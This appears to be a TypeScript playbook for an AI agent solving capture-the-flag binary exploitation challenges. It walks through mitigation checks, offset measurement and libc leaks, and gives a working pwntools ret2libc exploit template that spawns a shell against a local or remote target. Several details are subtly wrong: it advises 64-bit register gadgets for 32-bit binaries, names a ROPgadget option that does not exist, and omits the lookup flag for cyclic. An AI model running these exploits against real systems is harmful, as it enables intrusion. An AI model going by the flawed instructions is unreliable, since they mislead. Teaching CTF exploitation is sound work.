import type { Playbook } from './index.ts'

/**
 * Exploitation of a memory-corruption bug.
 *
 * The through-line of the whole category: the mitigations decide the technique,
 * the technique needs a leak, and the leak comes from a *different* bug than the
 * one that gives control. A bare stack overflow against a PIE+canary binary is
 * not a challenge, it is two challenges, and most of the time lost in pwn is
 * spent solving them in the wrong order.
 */
export const pwnPlaybook: Playbook = {
  category: 'pwn',
  summary:
    'Memory-corruption exploitation in a fixed order: read the mitigations, find the input path, leak one address you did not choose, then take the instruction pointer. Every technique here is a consequence of which mitigations step 1 found.',
  detect: [
    'A native binary shipped with the challenge (ELF on Linux, PE on Windows, Mach-O on macOS), often with "pwn", "vuln", "bof" or the category in the filename.',
    'Pasted `checksec --file=...` output: PIE, NX, stack canary, RELRO, "stripped".',
    'A `host:port` you connect to and push raw bytes at, with no expected human-readable output.',
    'The brief mentions a buffer overflow, format string, use-after-free, off-by-one, heap bug, or a crash address.',
    'A `Dockerfile`, `libc.so.6`, and sometimes a `flag.txt` alongside the binary — the classic pwn bundle.',
  ],
  steps: [
    {
      title: 'Record the mitigations before writing a line of exploit',
      note:
        'Bitness, PIE, NX, canary and RELRO fully determine the technique, and they are cheap to read. Do this first every time, even for a challenge you recognise, because getting one of them wrong costs the whole exploit. RELRO decides whether the GOT is writable; NX decides whether stack shellcode is possible at all; PIE decides whether *any* address is known.',
      commands: [
        'file ./chall',
        'checksec --file=./chall',
        'readelf -h ./chall | head -20',
        'readelf -lW ./chall | grep -E "GNU_STACK|GNU_RELRO"',
        'readelf -sW ./chall | grep -E "__stack_chk_fail|__stack_chk_guard"',
        'ldd ./chall',
        'strings -a ./chall | head -50',
      ],
      signals: [
        '"ELF 64-bit LSB pie executable, dynamically linked" → ASLR is on; nothing is at a known address until you leak.',
        'GNU_STACK with RW and no E → NX is off, so injected stack shellcode is viable. With E it is a ROP problem.',
        '"__stack_chk_fail" present → a stack canary. A plain overflow will die in the canary check, not in your payload.',
        'A separate GNU_RELRO segment plus a BIND_NOW dynamic tag → Full RELRO: the GOT is read-only, so no GOT overwrite.',
        '"not a dynamic executable" / statically linked → no libc to leak, and libc gadgets are unavailable. Work with what is in the binary.',
      ],
    },
    {
      title: 'Learn how the program takes input before reading any disassembly',
      note:
        'The I/O shape tells you which primitive to hunt for. A menu-driven program with a numbered choice has a different bug (usually an out-of-bounds index) than a one-shot `read` loop, and guessing wrong here sends you to the wrong function for an hour.',
      commands: [
        './chall',
        './chall --help',
        'printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./chall; echo "exit=$?"',
        'strings -a ./chall | grep -iE "read|write|gets|scanf|puts|printf|menu|choice|name|flag|win|shell|system|exec|/bin/sh"',
      ],
      signals: [
        'It hangs waiting for input → it reads stdin; that is your transport for the eventual exploit.',
        'It segfaults on a long line → the overflow is real and the length is not validated.',
        'A numbered menu → look for a user-controlled index into a fixed-size array, not a stack buffer.',
        'It exits immediately with no output → the argument vector or an environment variable may carry the input, or a guard check fails early.',
      ],
    },
    {
      title: 'Locate the entry path and any "win" function',
      note:
        'You are looking for two symbols: the function that copies attacker-controlled bytes into a fixed buffer, and a function that does what you want once you own the instruction pointer (it calls `system`, reads the flag, or is otherwise unreachable). A stripped binary hides both — then the imports are the only handles you get.',
      commands: [
        'nm -C ./chall | grep -iE " (main|win|shell|get_flag|read_flag|flag|vuln|read_buf)$"',
        'rabin2 -qs ./chall | grep -iE "main|win|flag|shell"',
        'r2 -q -c "aaa; afl" ./chall',
        'r2 -q -c "aaa; afl~main" ./chall',
        'objdump -d -M intel ./chall | sed -n "/<main>:/,/^$/p"',
        'gdb -q ./chall -ex "info functions" -ex quit',
      ],
      signals: [
        '`nm` says "no symbols" → stripped. Start from `main` via the `__libc_start_main` argument in Ghidra, and from the PLT (`r2 -q -c "aaa; afl~imp."`, `objdump -T ./chall`).',
        'A `win`/`get_flag` symbol that nothing in `main` calls → the intended finish is a direct `ret` to it (ret2win), and you do not need a libc leak at all.',
        'A function that opens `flag.txt`, `/flag`, or `./flag` → the flag is read from disk at the end; your job is only to reach that function.',
        'Many small `read@plt`-taking functions → one of them has a bad length argument; that call site is the entry path.',
      ],
    },
    {
      title: 'Prove the overflow and measure the offset with a cyclic pattern',
      note:
        'Never guess the offset. Feed a repeating byte pattern and let the crash tell you the exact distance from the buffer start to the saved return address. Generate the pattern in a file with `write_file` and run it — a `python3 -c` one-liner with nested quoting does not survive the shell layer. This is the same reason the exploit itself has to be a real file.',
      commands: [
        'write_file gen_cyclic.py  —  from pwn import *; open("pattern.txt","wb").write(cyclic(400))',
        'python3 gen_cyclic.py',
        './chall < pattern.txt ; echo "exit=$?"',
        'gdb -q -ex "set pagination off" -ex "run < pattern.txt" -ex "bt" -ex "info registers" -ex quit ./chall',
        'cyclic <the crashing value from `info registers`>   # reverses the pattern: prints the exact offset',
        'ROPgadget --binary ./chall --only "pop|ret" --ret2win',
        'ROPgadget --binary ./chall --string "/bin/sh"',
      ],
      signals: [
        'The crash is in `__stack_chk_fail` → you have a canary, not an offset problem. Go to the leak step first; no ROP chain will run until the canary is intact.',
        '`cyclic` reports "offset N does not appear in your cyclic pattern" → the write never reached the saved return address. Either the input is length-checked, or the overflow is into a global/heap buffer and you have the wrong bug.',
        'The offset is identical on every run → stack ASLR is not randomising this path (common under a forking server); the number is usable directly.',
        'The crash PC is inside your cyclic pattern → the buffer is executable and you overwrote the return address; the computed offset is trustworthy.',
      ],
    },
    {
      title: 'Find the leak primitive — usually a different bug than the overflow',
      note:
        'You need exactly one pointer value you did not choose: a libc address, the canary, the PIE base, or a heap pointer. Prefer a libc leak, because every later address derives from it. Look for anything that prints memory you influence: `puts`/`printf` on a stack buffer, a bare `printf(user_input)` (format string), or an index you can push out of bounds.',
      commands: [
        'r2 -q -c "aaa; axt @ sym.imp.puts" ./chall',
        'r2 -q -c "aaa; axt @ sym.imp.printf" ./chall',
        'objdump -d -M intel ./chall | grep -B4 -A2 -E "call.*(puts|printf)@plt"',
        'strings -a ./chall | grep -E "%[0-9]*\\$?[0-9]*[spdxu]"',
        'r2 -q -c "aaa; afl~gets" ./chall',
      ],
      signals: [
        '`puts` or `printf` called on a pointer into your buffer → put a `ret` gadget where the return address goes, then read whatever follows the buffer (the canary, a saved pointer, a libc address) from the same connection.',
        'A `printf` whose only argument is your input, with no `%s` → format string. `%p` walks the stack, `%N$p` picks a specific slot, `%7$s` reads a pointer from that slot as a string.',
        '`read(fd, buf, 0x400)` into a `0x100` buffer with no canary in between → the leak and the overwrite are the same bug: send padding, let the function echo or the next call print, then send the chain on the same connection.',
        'No print path at all, but a PIE binary with a `read` primitive → partial pointer overwrite. ASLR leaves the low 12 bits of any address unchanged, so clobbering only the low 1-2 bytes of a saved pointer walks the executable, libc, or stack by page.',
      ],
    },
    {
      title: 'Build the exploit as a real .py file, not `python3 -c`',
      note:
        'Write the exploit to disk with `write_file` and run it. Nested quotes, `\\n` escapes and pwntools\' indentation all break through a shell `-c` string, and a broken one-liner wastes a whole iteration cycle. Iterate against the local binary first; only point it at the remote when the local run is clean.\n\nStarting template (edit, do not paste blindly):\n\n```python\nfrom pwn import *\ncontext.arch = \'amd64\'          # match the binary: \'i386\' for 32-bit\ncontext.log_level = \'info\'\n\nelf  = ELF(\'./chall\')\nlibc = ELF(\'/lib/x86_64-linux-gnu/libc.so.6\')   # the CHALLENGE libc, not the host\'s\n\nOFFSET = 72                        # from step 4. Never a guess.\np = process(\'./chall\')             # remote(\'HOST\', PORT) when the local run works\n\n# 1. leak\np.recvuntil(b\'name: \')\np.sendline(b\'A\' * OFFSET)\nleak = u64(p.recvline().strip().ljust(8, b\'\\x00\'))\nlibc.address = leak - libc.symbols[\'puts\']    # subtract the symbol you ACTUALLY leaked\n\n# 2. chain\nrop = ROP(libc)\npayload  = flat(b\'B\' * OFFSET, rop.ret(), rop.call(\'system\', b\'/bin/sh\'))\np.sendline(payload)\np.interactive()\n```',
      commands: [
        'write_file exploit.py',
        'python3 exploit.py                       # local, repeat until clean',
        'python3 exploit.py remote HOST PORT      # edit the transport, keep the logic',
        'python3 -c "from pwn import *; print(context.arch)"   # import probe only, never the exploit',
      ],
      signals: [
        '"libc @ 0x7f..." ending in 000 → the leak is right. A base that is not page-aligned means you are reading the wrong offset or the wrong symbol.',
        '`EOFError` or the process exiting before your input → the payload is malformed or the program closed. Print `payload.hex()` and re-read step 4.',
        'It works locally and hangs on the remote → different libc, different container, or a filter in front. Re-check the leak, not the chain.',
      ],
    },
    {
      title: 'Choose the finish line the mitigations allow',
      note:
        'With a libc leak the ending is mechanical. Without one it is not — and several endings are impossible depending on what step 1 reported. Pick from this list rather than defaulting to ret2libc every time.',
      commands: [
        'one_gadget /lib/x86_64-linux-gnu/libc.so.6',
        'ROPgadget --binary ./chall --only "pop|ret"',
        'ROPgadget --binary ./chall --string "flag"',
        'ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --ropchain --rawArch=x86_64',
        'readelf -sW ./chall | grep -iE " (system|execve|puts|printf)@?"',
      ],
      signals: [
        'A `win`/`get_flag` symbol exists and PIE is off → `ROP(elf).ret2win()`. No leak, no libc, done. PIE on → you still need a PIE base leak first.',
        '`one_gadget` prints candidates but each has a constraint (stack must be 16-byte aligned, `[rsp+0x30] == NULL`, an env var must be set) that the payload does not satisfy → fall back to `rop.call(\'system\', b\'/bin/sh\')`.',
        'Full RELRO rules out a GOT overwrite. No leak either → you need a write-what-where primitive from a heap bug (unlink, tcache poisoning, house of force) instead.',
        'Tiny buffer, long chain → SROP: one `syscall` gadget plus a forged `SigreturnFrame` from pwntools.',
        '32-bit → `rop.call(\'execve\', [b\'/bin/sh\', 0, 0])` via `int 0x80`, and pop-chain gadgets (`pop rdx; pop rsi; pop rdi; ret`) are common in libc.',
      ],
    },
    {
      title: 'Verify against the target and re-check the libc',
      note:
        'The local and remote binaries are frequently not the same build, and the local libc is almost never the remote one. A payload that is correct locally and hangs remotely has usually leaked the right *kind* of address from the wrong *libc*.',
      commands: [
        'sha256sum ./chall',
        'ldd ./chall',
        'patchelf --print-interpreter ./chall',
        'patchelf --print-rpath ./chall',
        'strings -a ./chall | grep -iE "libc|glibc|version"',
      ],
      signals: [
        'Local works, remote prints nothing and exits → wrong libc. Re-derive the offsets from the challenge\'s own `libc.so.6`, not the one on the box.',
        'Local works, remote says "no such file or directory" after the shell should be open → you reached `system` with a bad pointer, or an `execve` failed on the argv/env setup.',
        'A forking server that returns the same libc base on every connection → you can drop the leak and hardcode offsets, but confirm by connecting twice and comparing.',
      ],
    },
  ],
  gotchas: [
    'A PIE base leak is a prerequisite, not an optimisation. Without it every address in a ROP chain is a guess, and the guess costs you one failed connection per attempt. If a `win` function exists and PIE is on, look for a partial overwrite of the saved return address before building a full leak chain.',
    'The stack canary is a *separate* leak from the libc leak, and plenty of "buffer overflow" challenges are really "leak the canary, then overflow". Check for `__stack_chk_fail` before investing an hour in a chain that can never execute.',
    'ret2libc needs `pop rdi; ret` to set the first argument, plus a bare `ret` before `system` on x86-64 to keep the stack 16-byte aligned — without it you get `movaps` and an instant segfault. 32-bit has no alignment requirement but needs `pop rdx; pop rsi; pop rdi; ret` or `int 0x80` for a syscall.',
    '`checksec` is often not installed. Read the mitigations yourself: `file` for PIE, `readelf -lW | grep GNU_STACK` for NX (look for the `E` in the flags), `readelf -sW | grep __stack_chk_fail` for the canary, `readelf -lW | grep GNU_RELRO` plus the BIND_NOW entry for RELRO.',
    '32-bit and 64-bit are different languages. Set `context.arch` in pwntools to match or every offset is wrong; 32-bit has trivial ASLR entropy, short addresses that wrap, `int 0x80` instead of `syscall`, and shellcode-friendly layouts that 64-bit removed.',
    'Not every service is a forking server. If the target forks per connection, libc and stack are often identical between connections; if it re-execs, you leak every time. Assuming the wrong one wastes either a leak or a whole exploit.',
    '`gdb`/`pwndbg` may be absent in the challenge container. The fallbacks are `LD_PRELOAD` of a tiny C shim, `ltrace`/`strace` (which silently produce nothing if the library is missing — check the exit code), or `LD_DEBUG=libs` for the load picture.',
    'Do not kill a listener you did not start. A stray `nc -l` from an earlier attempt will happily swallow your payload and make a working exploit look broken.',
  ],
  successShape:
    'The flag text itself, printed to stdout or read by the `win`/`get_flag` function you reached — usually `flag{...}`, `CTF{...}`, or the challenge\'s own prefix. A shell is a means, not an answer: after `ret2libc` you still have to `cat /flag*` (or read whatever path the binary names), and the recovered string is what you report.',
}
